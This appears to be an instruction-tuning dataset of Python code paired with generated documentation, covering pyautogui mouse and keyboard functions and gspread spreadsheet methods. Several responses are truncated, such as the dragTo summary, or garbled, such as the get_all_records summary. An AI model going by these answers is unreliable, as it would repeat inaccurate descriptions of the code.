{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef dragTo(x=None, y=None, duration=0.0, tween=linear, button='left', pause=None, _pause=True, mouseDownUp=True):\n    _failSafeCheck()\n    x, y = _unpackXY(x, y)\n\n    if mouseDownUp:\n        mouseDown(button=button, _pause=False)\n    _mouseMoveDrag('drag', x, y, 0, 0, duration, tween, button)\n    if mouseDownUp:\n        mouseUp(button=button, _pause=False)\n\n    _autoPause(pause, _pause)", "response": "Performs a mouse drag to the a\n   ."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef dragRel(xOffset=0, yOffset=0, duration=0.0, tween=linear, button='left', pause=None, _pause=True, mouseDownUp=True):\n    if xOffset is None:\n        xOffset = 0\n    if yOffset is None:\n        yOffset = 0\n\n    if type(xOffset) in (tuple, list):\n        xOffset, yOffset = xOffset[0], xOffset[1]\n\n    if xOffset == 0 and yOffset == 0:\n        return # no-op case\n\n    _failSafeCheck()\n\n    mousex, mousey = platformModule._position()\n    if mouseDownUp:\n        mouseDown(button=button, _pause=False)\n    _mouseMoveDrag('drag', mousex, mousey, xOffset, yOffset, duration, tween, button)\n    if mouseDownUp:\n        mouseUp(button=button, _pause=False)\n\n    _autoPause(pause, _pause)", "response": "Performs a mouse drag to the a\n    point on the screen relative to its current position."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _mouseMoveDrag(moveOrDrag, x, y, xOffset, yOffset, duration, tween=linear, button=None):\n\n    # The move and drag code is similar, but OS X requires a special drag event instead of just a move event when dragging.\n    # See https://stackoverflow.com/a/2696107/1893164\n    assert moveOrDrag in ('move', 'drag'), \"moveOrDrag must be in ('move', 'drag'), not %s\" % (moveOrDrag)\n\n    if sys.platform != 'darwin':\n        moveOrDrag = 'move' # Only OS X needs the drag event specifically.\n\n    xOffset = int(xOffset) if xOffset is not None else 0\n    yOffset = int(yOffset) if yOffset is not None else 0\n\n    if x is None and y is None and xOffset == 0 and yOffset == 0:\n        return  # Special case for no mouse movement at all.\n\n    startx, starty = position()\n\n    x = int(x) if x is not None else startx\n    y = int(y) if y is not None else starty\n\n    # x, y, xOffset, yOffset are now int.\n    x += xOffset\n    y += yOffset\n\n    width, height = size()\n\n    # Make sure x and y are within the screen bounds.\n    x = max(0, min(x, width - 1))\n    y = max(0, min(y, height - 1))\n\n    # If the duration is small enough, just move the cursor there instantly.\n    steps = [(x, y)]\n\n    if duration > MINIMUM_DURATION:\n        # Non-instant moving/dragging involves tweening:\n        num_steps = max(width, height)\n        sleep_amount = duration / num_steps\n        if sleep_amount < MINIMUM_SLEEP:\n            num_steps = int(duration / MINIMUM_SLEEP)\n            sleep_amount = duration / num_steps\n\n        steps = [\n            getPointOnLine(startx, starty, x, y, tween(n / num_steps))\n            for n in range(num_steps)\n        ]\n        # Making sure the last position is the actual destination.\n        steps.append((x, y))\n\n    for tweenX, tweenY in steps:\n        if len(steps) > 1:\n            # A single step does not require tweening.\n            time.sleep(sleep_amount)\n\n        _failSafeCheck()\n        tweenX = int(round(tweenX))\n        tweenY = int(round(tweenY))\n        if moveOrDrag == 'move':\n            platformModule._moveTo(tweenX, tweenY)\n        elif moveOrDrag == 'drag':\n            platformModule._dragTo(tweenX, tweenY, button)\n        else:\n            raise NotImplementedError('Unknown value of moveOrDrag: {0}'.format(moveOrDrag))\n\n    _failSafeCheck()", "response": "Handles the mouse move and drag events."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nperform a keyboard key press without the release.", "response": "def keyDown(key, pause=None, _pause=True):\n    \"\"\"Performs a keyboard key press without the release. This will put that\n    key in a held down state.\n\n    NOTE: For some reason, this does not seem to cause key repeats like would\n    happen if a keyboard key was held down on a text field.\n\n    Args:\n      key (str): The key to be pressed down. The valid names are listed in\n      KEYBOARD_KEYS.\n\n    Returns:\n      None\n    \"\"\"\n    if len(key) > 1:\n        key = key.lower()\n\n    _failSafeCheck()\n    platformModule._keyDown(key)\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nperform a keyboard key release up.", "response": "def keyUp(key, pause=None, _pause=True):\n    \"\"\"Performs a keyboard key release (without the press down beforehand).\n\n    Args:\n      key (str): The key to be released up. The valid names are listed in\n      KEYBOARD_KEYS.\n\n    Returns:\n      None\n    \"\"\"\n    if len(key) > 1:\n        key = key.lower()\n\n    _failSafeCheck()\n    platformModule._keyUp(key)\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef press(keys, presses=1, interval=0.0, pause=None, _pause=True):\n    if type(keys) == str:\n        keys = [keys] # put string in a list\n    else:\n        lowerKeys = []\n        for s in keys:\n            if len(s) > 1:\n                lowerKeys.append(s.lower())\n            else:\n                lowerKeys.append(s)\n    interval = float(interval)\n    for i in range(presses):\n        for k in keys:\n            _failSafeCheck()\n            platformModule._keyDown(k)\n            platformModule._keyUp(k)\n        time.sleep(interval)\n\n    _autoPause(pause, _pause)", "response": "Performs a keyboard key press down followed by a release."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nperforms a keyboard key press down followed by a release for each of the keyboards in message.", "response": "def typewrite(message, interval=0.0, pause=None, _pause=True):\n    \"\"\"Performs a keyboard key press down, followed by a release, for each of\n    the characters in message.\n\n    The message argument can also be list of strings, in which case any valid\n    keyboard name can be used.\n\n    Since this performs a sequence of keyboard presses and does not hold down\n    keys, it cannot be used to perform keyboard shortcuts. Use the hotkey()\n    function for that.\n\n    Args:\n      message (str, list): If a string, then the characters to be pressed. If a\n        list, then the key names of the keys to press in order. The valid names\n        are listed in KEYBOARD_KEYS.\n      interval (float, optional): The number of seconds in between each press.\n        0.0 by default, for no pause in between presses.\n\n    Returns:\n      None\n    \"\"\"\n    interval = float(interval)\n\n    _failSafeCheck()\n\n    for c in message:\n        if len(c) > 1:\n            c = c.lower()\n        press(c, _pause=False)\n        time.sleep(interval)\n        _failSafeCheck()\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef displayMousePosition(xOffset=0, yOffset=0):\n    print('Press Ctrl-C to quit.')\n    if xOffset != 0 or yOffset != 0:\n        print('xOffset: %s yOffset: %s' % (xOffset, yOffset))\n    resolution = size()\n    try:\n        while True:\n            # Get and print the mouse coordinates.\n            x, y = position()\n            positionStr = 'X: ' + str(x - xOffset).rjust(4) + ' Y: ' + str(y - yOffset).rjust(4)\n            if (x - xOffset) < 0 or (y - yOffset) < 0 or (x - xOffset) >= resolution[0] or (y - yOffset) >= resolution[1]:\n                pixelColor = ('NaN', 'NaN', 'NaN')\n            else:\n                pixelColor = pyscreeze.screenshot().getpixel((x, y))\n            positionStr += ' RGB: (' + str(pixelColor[0]).rjust(3)\n            positionStr += ', ' + str(pixelColor[1]).rjust(3)\n            positionStr += ', ' + str(pixelColor[2]).rjust(3) + ')'\n            sys.stdout.write(positionStr)\n            sys.stdout.write('\\b' * len(positionStr))\n            sys.stdout.flush()\n    except KeyboardInterrupt:\n        sys.stdout.write('\\n')\n        sys.stdout.flush()", "response": "This function will display the location and RGB of the mouse cursor. It will automatically display the location and RGB of the mouse cursor."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nperforming a keyboard key press without the release.", "response": "def _keyDown(key):\n    \"\"\"Performs a keyboard key press without the release. This will put that\n    key in a held down state.\n\n    NOTE: For some reason, this does not seem to cause key repeats like would\n    happen if a keyboard key was held down on a text field.\n\n    Args:\n      key (str): The key to be pressed down. The valid names are listed in\n      pyautogui.KEY_NAMES.\n\n    Returns:\n      None\n    \"\"\"\n    if key not in keyboardMapping or keyboardMapping[key] is None:\n        return\n\n    needsShift = pyautogui.isShiftCharacter(key)\n\n    \"\"\"\n    # OLD CODE: The new code relies on having all keys be loaded in keyboardMapping from the start.\n    if key in keyboardMapping.keys():\n        vkCode = keyboardMapping[key]\n    elif len(key) == 1:\n        # note: I could use this case to update keyboardMapping to cache the VkKeyScan results, but I've decided not to just to make any possible bugs easier to reproduce.\n        vkCode = ctypes.windll.user32.VkKeyScanW(ctypes.wintypes.WCHAR(key))\n        if vkCode == -1:\n            raise ValueError('There is no VK code for key \"%s\"' % (key))\n        if vkCode > 0x100: # the vk code will be > 0x100 if it needs shift\n            vkCode -= 0x100\n            needsShift = True\n    \"\"\"\n    mods, vkCode = divmod(keyboardMapping[key], 0x100)\n\n    for apply_mod, vk_mod in [(mods & 4, 0x12), (mods & 2, 0x11),\n        (mods & 1 or needsShift, 0x10)]: #HANKAKU not suported! mods & 8\n        if apply_mod:\n            ctypes.windll.user32.keybd_event(vk_mod, 0, 0, 0) #\n    ctypes.windll.user32.keybd_event(vkCode, 0, 0, 0)\n    for apply_mod, vk_mod in [(mods & 1 or needsShift, 0x10), (mods & 2, 0x11),\n        (mods & 4, 0x12)]: #HANKAKU not suported! mods & 8\n        if apply_mod:\n            ctypes.windll.user32.keybd_event(vk_mod, 0, KEYEVENTF_KEYUP, 0)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the current xy coordinates of the mouse cursor as a two - integer tuple by calling the GetCursorPos win32 function.", "response": "def _position():\n    \"\"\"Returns the current xy coordinates of the mouse cursor as a two-integer\n    tuple by calling the GetCursorPos() win32 function.\n\n    Returns:\n      (x, y) tuple of the current xy coordinates of the mouse cursor.\n    \"\"\"\n\n    cursor = POINT()\n    ctypes.windll.user32.GetCursorPos(ctypes.byref(cursor))\n    return (cursor.x, cursor.y)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsending the mouse down event to the Windows by calling the mouse_event function.", "response": "def _mouseDown(x, y, button):\n    \"\"\"Send the mouse down event to Windows by calling the mouse_event() win32\n    function.\n\n    Args:\n      x (int): The x position of the mouse event.\n      y (int): The y position of the mouse event.\n      button (str): The mouse button, either 'left', 'middle', or 'right'\n\n    Returns:\n      None\n    \"\"\"\n    if button == 'left':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_LEFTDOWN, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    elif button == 'middle':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_MIDDLEDOWN, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    elif button == 'right':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_RIGHTDOWN, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    else:\n        assert False, \"button argument not in ('left', 'middle', 'right')\""}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _mouseUp(x, y, button):\n    if button == 'left':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_LEFTUP, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    elif button == 'middle':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_MIDDLEUP, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    elif button == 'right':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_RIGHTUP, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    else:\n        assert False, \"button argument not in ('left', 'middle', 'right')\"", "response": "Send the mouse up event to the Windows by calling the mouse_event function."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsend the mouse click event to Windows by calling the mouse_event function.", "response": "def _click(x, y, button):\n    \"\"\"Send the mouse click event to Windows by calling the mouse_event() win32\n    function.\n\n    Args:\n      button (str): The mouse button, either 'left', 'middle', or 'right'\n      x (int): The x position of the mouse event.\n      y (int): The y position of the mouse event.\n\n    Returns:\n      None\n    \"\"\"\n    if button == 'left':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_LEFTCLICK, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    elif button == 'middle':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_MIDDLECLICK, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    elif button == 'right':\n        try:\n            _sendMouseEvent(MOUSEEVENTF_RIGHTCLICK, x, y)\n        except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass\n    else:\n        assert False, \"button argument not in ('left', 'middle', 'right')\""}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _scroll(clicks, x=None, y=None):\n    startx, starty = _position()\n    width, height = _size()\n\n    if x is None:\n        x = startx\n    else:\n        if x < 0:\n            x = 0\n        elif x >= width:\n            x = width - 1\n    if y is None:\n        y = starty\n    else:\n        if y < 0:\n            y = 0\n        elif y >= height:\n            y = height - 1\n\n    try:\n        _sendMouseEvent(MOUSEEVENTF_WHEEL, x, y, dwData=clicks)\n    except (PermissionError, OSError): # TODO: We need to figure out how to prevent these errors, see https://github.com/asweigart/pyautogui/issues/60\n            pass", "response": "Send the mouse vertical scroll event to the available Windows modules."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nlogs-in to Google API using OAuth2 credentials.", "response": "def authorize(credentials, client_class=Client):\n    \"\"\"Login to Google API using OAuth2 credentials.\n    This is a shortcut function which\n    instantiates :class:`gspread.client.Client`\n    and performs login right away.\n\n    :returns: :class:`gspread.Client` instance.\n    \"\"\"\n    client = client_class(auth=credentials)\n    client.login()\n    return client"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nlowering - level method that directly calls sheets. batchUpdate.", "response": "def batch_update(self, body):\n        \"\"\"Lower-level method that directly calls `spreadsheets.batchUpdate <https://developers.google.com/sheets/api/reference/rest/v4/spreadsheets/batchUpdate>`_.\n\n        :param dict body: `Request body <https://developers.google.com/sheets/api/reference/rest/v4/spreadsheets/batchUpdate#request-body>`_.\n        :returns: `Response body <https://developers.google.com/sheets/api/reference/rest/v4/spreadsheets/batchUpdate#response-body>`_.\n        :rtype: dict\n\n        .. versionadded:: 3.0\n\n        \"\"\"\n        r = self.client.request(\n            'post',\n            SPREADSHEET_BATCH_UPDATE_URL % self.id,\n            json=body\n        )\n\n        return r.json()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef values_append(self, range, params, body):\n        url = SPREADSHEET_VALUES_APPEND_URL % (self.id, quote(range))\n        r = self.client.request('post', url, params=params, json=body)\n        return r.json()", "response": "Lower - level method that directly calls spreadsheets. values. append <https://developers. google. com / sheets > _. Values are appended after the last row of the table."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef values_clear(self, range):\n        url = SPREADSHEET_VALUES_CLEAR_URL % (self.id, quote(range))\n        r = self.client.request('post', url)\n        return r.json()", "response": "Lower - level method that directly calls spreadsheets. values. clear."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef values_get(self, range, params=None):\n        url = SPREADSHEET_VALUES_URL % (self.id, quote(range))\n        r = self.client.request('get', url, params=params)\n        return r.json()", "response": "Lower - level method that directly calls sheets. values. get <https://developers. google. com / sheets / api / guides / concepts#a1_notation >_ of the values to retrieve."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nlower - level method that directly calls spreadsheets. values. update.", "response": "def values_update(self, range, params=None, body=None):\n        \"\"\"Lower-level method that directly calls `spreadsheets.values.update <https://developers.google.com/sheets/api/reference/rest/v4/spreadsheets.values/update>`_.\n\n        :param str range: The `A1 notation <https://developers.google.com/sheets/api/guides/concepts#a1_notation>`_ of the values to update.\n        :param dict params: (optional) `Query parameters <https://developers.google.com/sheets/api/reference/rest/v4/spreadsheets.values/update#query-parameters>`_.\n        :param dict body: (optional) `Request body <https://developers.google.com/sheets/api/reference/rest/v4/spreadsheets.values/update#request-body>`_.\n        :returns: `Response body <https://developers.google.com/sheets/api/reference/rest/v4/spreadsheets.values/update#response-body>`_.\n        :rtype: dict\n\n        Example::\n\n            sh.values_update(\n                'Sheet1!A2',\n                params={\n                    'valueInputOption': 'USER_ENTERED'\n                },\n                body={\n                    'values': [[1, 2, 3]]\n                }\n            )\n\n        .. versionadded:: 3.0\n\n        \"\"\"\n        url = SPREADSHEET_VALUES_URL % (self.id, quote(range))\n        r = self.client.request('put', url, params=params, json=body)\n        return r.json()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a worksheet with specified index.", "response": "def get_worksheet(self, index):\n        \"\"\"Returns a worksheet with specified `index`.\n\n        :param index: An index of a worksheet. Indexes start from zero.\n        :type index: int\n\n        :returns: an instance of :class:`gsperad.models.Worksheet`\n                  or `None` if the worksheet is not found.\n\n        Example. To get first worksheet of a spreadsheet:\n\n        >>> sht = client.open('My fancy spreadsheet')\n        >>> worksheet = sht.get_worksheet(0)\n\n        \"\"\"\n        sheet_data = self.fetch_sheet_metadata()\n\n        try:\n            properties = sheet_data['sheets'][index]['properties']\n            return Worksheet(self, properties)\n        except (KeyError, IndexError):\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef worksheets(self):\n        sheet_data = self.fetch_sheet_metadata()\n        return [Worksheet(self, x['properties']) for x in sheet_data['sheets']]", "response": "Returns a list of all sheets in a spreadsheet."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a worksheet with the specified title.", "response": "def worksheet(self, title):\n        \"\"\"Returns a worksheet with specified `title`.\n\n        :param title: A title of a worksheet. If there're multiple\n                      worksheets with the same title, first one will\n                      be returned.\n        :type title: int\n\n        :returns: an instance of :class:`gsperad.models.Worksheet`.\n\n        Example. Getting worksheet named 'Annual bonuses'\n\n        >>> sht = client.open('Sample one')\n        >>> worksheet = sht.worksheet('Annual bonuses')\n\n        \"\"\"\n        sheet_data = self.fetch_sheet_metadata()\n        try:\n            item = finditem(\n                lambda x: x['properties']['title'] == title,\n                sheet_data['sheets']\n            )\n            return Worksheet(self, item['properties'])\n        except (StopIteration, KeyError):\n            raise WorksheetNotFound(title)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_worksheet(self, title, rows, cols):\n        body = {\n            'requests': [{\n                'addSheet': {\n                    'properties': {\n                        'title': title,\n                        'sheetType': 'GRID',\n                        'gridProperties': {\n                            'rowCount': rows,\n                            'columnCount': cols\n                        }\n                    }\n                }\n            }]\n        }\n\n        data = self.batch_update(body)\n\n        properties = data['replies'][0]['addSheet']['properties']\n\n        worksheet = Worksheet(self, properties)\n\n        return worksheet", "response": "Adds a new worksheet to a spreadsheet."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef duplicate_sheet(\n        self,\n        source_sheet_id,\n        insert_sheet_index=None,\n        new_sheet_id=None,\n        new_sheet_name=None\n    ):\n        \"\"\"Duplicates the contents of a sheet.\n\n        :param int source_sheet_id: The sheet ID to duplicate.\n        :param int insert_sheet_index: (optional) The zero-based index\n                                       where the new sheet should be inserted.\n                                       The index of all sheets after this are\n                                       incremented.\n        :param int new_sheet_id: (optional) The ID of the new sheet.\n                                 If not set, an ID is chosen. If set, the ID\n                                 must not conflict with any existing sheet ID.\n                                 If set, it must be non-negative.\n        :param str new_sheet_name: (optional) The name of the new sheet.\n                                   If empty, a new name is chosen for you.\n\n        :returns: a newly created :class:`<gspread.models.Worksheet>`.\n\n        .. versionadded:: 3.1.0\n\n        \"\"\"\n        body = {\n            'requests': [{\n                'duplicateSheet': {\n                    'sourceSheetId': source_sheet_id,\n                    'insertSheetIndex': insert_sheet_index,\n                    'newSheetId': new_sheet_id,\n                    'newSheetName': new_sheet_name\n                }\n            }]\n        }\n\n        data = self.batch_update(body)\n\n        properties = data['replies'][0]['duplicateSheet']['properties']\n\n        worksheet = Worksheet(self, properties)\n\n        return worksheet", "response": "Duplicates the contents of a sheet.\n\n        :param int source_sheet_id: The sheet ID to duplicate.\n        :param int insert_sheet_index: (optional) The zero-based index\n                                       where the new sheet should be inserted.\n                                       The index of all sheets after this are\n                                       incremented.\n        :param int new_sheet_id: (optional) The ID of the new sheet.\n                                 If not set, an ID is chosen. If set, the ID\n                                 must not conflict with any existing sheet ID.\n                                 If set, it must be non-negative.\n        :param str new_sheet_name: (optional) The name of the new sheet.\n                                   If empty, a new name is chosen for you.\n\n        :returns: a newly created :class:`<gspread.models.Worksheet>`.\n\n        .. versionadded:: 3.1.0"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef share(self, value, perm_type, role, notify=True, email_message=None, with_link=False):\n        self.client.insert_permission(\n            self.id,\n            value=value,\n            perm_type=perm_type,\n            role=role,\n            notify=notify,\n            email_message=email_message,\n            with_link=with_link\n        )", "response": "Share the spreadsheet with other accounts."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves permissions from a user or domain.", "response": "def remove_permissions(self, value, role='any'):\n        \"\"\"Remove permissions from a user or domain.\n\n        :param value: User or domain to remove permissions from\n        :type value: str\n        :param role: (optional) Permission to remove. Defaults to all\n                     permissions.\n        :type role: str\n\n        Example::\n\n            # Remove Otto's write permission for this spreadsheet\n            sh.remove_permissions('otto@example.com', role='writer')\n\n            # Remove all Otto's permissions for this spreadsheet\n            sh.remove_permissions('otto@example.com')\n        \"\"\"\n        permission_list = self.client.list_permissions(self.id)\n\n        key = 'emailAddress' if '@' in value else 'domain'\n\n        filtered_id_list = [\n            p['id'] for p in permission_list\n            if p[key] == value and (p['role'] == role or role == 'any')\n        ]\n\n        for permission_id in filtered_id_list:\n            self.client.remove_permission(self.id, permission_id)\n\n        return filtered_id_list"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef acell(self, label, value_render_option='FORMATTED_VALUE'):\n\n        return self.cell(\n            *(a1_to_rowcol(label)),\n            value_render_option=value_render_option\n        )", "response": "Returns an instance of a : class : gspread. models. Cell with the given label."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef cell(self, row, col, value_render_option='FORMATTED_VALUE'):\n\n        range_label = '%s!%s' % (self.title, rowcol_to_a1(row, col))\n        data = self.spreadsheet.values_get(\n            range_label,\n            params={'valueRenderOption': value_render_option}\n        )\n\n        try:\n            value = data['values'][0][0]\n        except KeyError:\n            value = ''\n\n        return Cell(row, col, value)", "response": "Returns an instance of a : class : ~gspread. models. Cell located at\n        row and col."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef range(self, name):\n\n        range_label = '%s!%s' % (self.title, name)\n\n        data = self.spreadsheet.values_get(range_label)\n\n        start, end = name.split(':')\n        (row_offset, column_offset) = a1_to_rowcol(start)\n        (last_row, last_column) = a1_to_rowcol(end)\n\n        values = data.get('values', [])\n\n        rect_values = fill_gaps(\n            values,\n            rows=last_row - row_offset + 1,\n            cols=last_column - column_offset + 1\n        )\n\n        return [\n            Cell(row=i + row_offset, col=j + column_offset, value=value)\n            for i, row in enumerate(rect_values)\n            for j, value in enumerate(row)\n        ]", "response": "Returns a list of Cell objects from a specified range."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a list of lists containing all cells values as strings.", "response": "def get_all_values(self):\n        \"\"\"Returns a list of lists containing all cells' values as strings.\n\n        .. note::\n\n            Empty trailing rows and columns will not be included.\n        \"\"\"\n\n        data = self.spreadsheet.values_get(self.title)\n\n        try:\n            return fill_gaps(data['values'])\n        except KeyError:\n            return []"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_all_records(\n        self,\n        empty2zero=False,\n        head=1,\n        default_blank=\"\",\n        allow_underscores_in_numeric_literals=False,\n    ):\n        \"\"\"Returns a list of dictionaries, all of them having the contents\n            of the spreadsheet with the head row as keys and each of these\n            dictionaries holding the contents of subsequent rows of cells\n            as values.\n\n            Cell values are numericised (strings that can be read as ints\n            or floats are converted).\n\n            :param empty2zero: (optional) Determines whether empty cells are\n                               converted to zeros.\n            :type empty2zero: bool\n            :param head: (optional) Determines wich row to use as keys, starting\n                         from 1 following the numeration of the spreadsheet.\n            :type head: int\n            :param default_blank: (optional) Determines whether empty cells are\n                                  converted to something else except empty string\n                                  or zero.\n            :type default_blank: str\n            :param allow_underscores_in_numeric_literals: (optional) Allow underscores\n                                                          in numeric literals,\n                                                          as introduced in PEP 515\n            :type allow_underscores_in_numeric_literals: bool\n            \"\"\"\n\n        idx = head - 1\n\n        data = self.get_all_values()\n\n        # Return an empty list if the sheet doesn't have enough rows\n        if len(data) <= idx:\n            return []\n\n        keys = data[idx]\n        values = [\n            numericise_all(\n                row,\n                empty2zero,\n                default_blank,\n                allow_underscores_in_numeric_literals,\n            )\n            for row in data[idx + 1:]\n        ]\n\n        return [dict(zip(keys, row)) for row in values]", "response": "Returns a list of dictionaries containing all of the contents of the contents of the next cell in the spreadsheet."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef row_values(self, row, value_render_option='FORMATTED_VALUE'):\n\n        range_label = '%s!A%s:%s' % (self.title, row, row)\n\n        data = self.spreadsheet.values_get(\n            range_label,\n            params={'valueRenderOption': value_render_option}\n        )\n\n        try:\n            return data['values'][0]\n        except KeyError:\n            return []", "response": "Returns a list of all values in a row."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a list of all values in column col.", "response": "def col_values(self, col, value_render_option='FORMATTED_VALUE'):\n        \"\"\"Returns a list of all values in column `col`.\n\n        Empty cells in this list will be rendered as :const:`None`.\n\n        :param col: Column number.\n        :type col: int\n        :param value_render_option: (optional) Determines how values should be\n                                    rendered in the the output. See\n                                    `ValueRenderOption`_ in the Sheets API.\n        :type value_render_option: str\n\n        .. _ValueRenderOption: https://developers.google.com/sheets/api/reference/rest/v4/ValueRenderOption\n\n        \"\"\"\n\n        start_label = rowcol_to_a1(1, col)\n        range_label = '%s!%s:%s' % (self.title, start_label, start_label[:-1])\n\n        data = self.spreadsheet.values_get(\n            range_label,\n            params={\n                'valueRenderOption': value_render_option,\n                'majorDimension': 'COLUMNS'\n            }\n        )\n\n        try:\n            return data['values'][0]\n        except KeyError:\n            return []"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update_acell(self, label, value):\n        return self.update_cell(*(a1_to_rowcol(label)), value=value)", "response": "Updates the value of a cell in A1 notation."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the value of a cell.", "response": "def update_cell(self, row, col, value):\n        \"\"\"Updates the value of a cell.\n\n        :param row: Row number.\n        :type row: int\n        :param col: Column number.\n        :type col: int\n        :param value: New value.\n\n        Example::\n\n            worksheet.update_cell(1, 1, '42')\n\n        \"\"\"\n        range_label = '%s!%s' % (self.title, rowcol_to_a1(row, col))\n\n        data = self.spreadsheet.values_update(\n            range_label,\n            params={\n                'valueInputOption': 'USER_ENTERED'\n            },\n            body={\n                'values': [[value]]\n            }\n        )\n\n        return data"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating many cells at once.", "response": "def update_cells(self, cell_list, value_input_option='RAW'):\n        \"\"\"Updates many cells at once.\n\n        :param cell_list: List of :class:`Cell` objects to update.\n        :param value_input_option: (optional) Determines how input data should\n                                    be interpreted. See `ValueInputOption`_ in\n                                    the Sheets API.\n        :type value_input_option: str\n\n        .. _ValueInputOption: https://developers.google.com/sheets/api/reference/rest/v4/ValueInputOption\n\n        Example::\n\n            # Select a range\n            cell_list = worksheet.range('A1:C7')\n\n            for cell in cell_list:\n                cell.value = 'O_o'\n\n            # Update in batch\n            worksheet.update_cells(cell_list)\n\n        \"\"\"\n\n        values_rect = cell_list_to_rect(cell_list)\n\n        start = rowcol_to_a1(min(c.row for c in cell_list), min(c.col for c in cell_list))\n        end = rowcol_to_a1(max(c.row for c in cell_list), max(c.col for c in cell_list))\n\n        range_label = '%s!%s:%s' % (self.title, start, end)\n\n        data = self.spreadsheet.values_update(\n            range_label,\n            params={\n                'valueInputOption': value_input_option\n            },\n            body={\n                'values': values_rect\n            }\n        )\n\n        return data"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef resize(self, rows=None, cols=None):\n        grid_properties = {}\n\n        if rows is not None:\n            grid_properties['rowCount'] = rows\n\n        if cols is not None:\n            grid_properties['columnCount'] = cols\n\n        if not grid_properties:\n            raise TypeError(\"Either 'rows' or 'cols' should be specified.\")\n\n        fields = ','.join(\n            'gridProperties/%s' % p for p in grid_properties.keys()\n        )\n\n        body = {\n            'requests': [{\n                'updateSheetProperties': {\n                    'properties': {\n                        'sheetId': self.id,\n                        'gridProperties': grid_properties\n                    },\n                    'fields': fields\n                }\n            }]\n        }\n\n        return self.spreadsheet.batch_update(body)", "response": "Resizes the worksheet. Specify one of rows or cols."}
